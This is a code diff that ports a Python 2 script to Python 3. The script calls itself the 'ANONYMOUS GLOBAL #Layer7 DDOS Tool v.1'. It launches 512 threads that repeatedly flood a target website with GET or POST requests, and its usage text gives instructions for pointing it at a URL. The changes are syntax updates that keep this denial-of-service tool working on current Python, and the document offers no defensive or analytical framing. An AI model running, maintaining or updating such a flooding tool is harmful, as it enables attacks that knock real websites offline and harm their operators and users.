@@ -17,7 +17,7 @@ class MyThread(Thread,):
         self.kill_received = False
     def run(self):
         while not self.kill_received:
-            server = socket.gethostbyname(self.site)
+            server = socket.gethostbyname(str(self.site))
             post = 'x' * 9999
             file = '/'
 
@@ -48,17 +48,17 @@ class MyThread(Thread,):
                 s.close()
                 #s.recv(50000)
             except:
-                print "Target Down?"
+                print("Target Down?")
 
 def da_delegator(SITE,DOS_TYPE):
     thread_count = 512
-    print '=' * 60
-    print 'ANONYMOUS GLOBAL #Layer7 Tool v.1'.center(60,'-')
-    print '=' * 60
+    print('=' * 60)
+    print('ANONYMOUS GLOBAL #Layer7 Tool v.1'.center(60,'-'))
+    print('=' * 60)
     threads = []
     for num in range(thread_count):
         thr1=MyThread(SITE,DOS_TYPE)
-        print 'start - %s' % thr1
+        print('start - %s' % thr1)
         thr1.start()
         threads.append(thr1)
         #thr1.join()
@@ -67,29 +67,26 @@ def da_delegator(SITE,DOS_TYPE):
             try:
                 # Join all threads using a timeout so it doesn't block
                 # Filter out threads which have been joined or are None
-                threads = [t.join(1) for t in threads if t is not
-None and t.isAlive()]
+                threads = [t.join(1) for t in threads if t is not None and t.is_alive()]
             except KeyboardInterrupt:
-                print "Ctrl-c received! Sending kill to threads... Just close The Terminal"
+                print("Ctrl-c received! Sending kill to threads... Just close The Terminal")
                 for t in threads:
                     t.kill_received = True
                     sys.exit(2)
 
 def main(argv):
     def usage():
-        print '=' * 60
-        print 'ANONYMOUS GLOBAL #Layer7 DDOS Tool v.1'.center(60,'-')
-        print '=' * 60
-        print 'For GET DOS - USAGE: Layer7.py -t get http://example.com'
-        print 'For POST DOS - USAGE: Layer7.py -t post http://example.com'
+        print('=' * 60)
+        print('ANONYMOUS GLOBAL #Layer7 DDOS Tool v.1'.center(60,'-'))
+        print('=' * 60)
+        print('For GET DOS - USAGE: Layer7.py -t get http://example.com')
+        print('For POST DOS - USAGE: Layer7.py -t post http://example.com')
         sys.exit(2)
     if not argv:
         usage()
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "t:h", ["help",
-"type"])
-    except getopt.GetoptError, err:
-        print str(err)
+        opts, args = getopt.getopt(sys.argv[1:], "t:h", ["help","type"])
+    except(getopt.GetoptError):
         sys.exit(2)
     output = None
     verbose = False
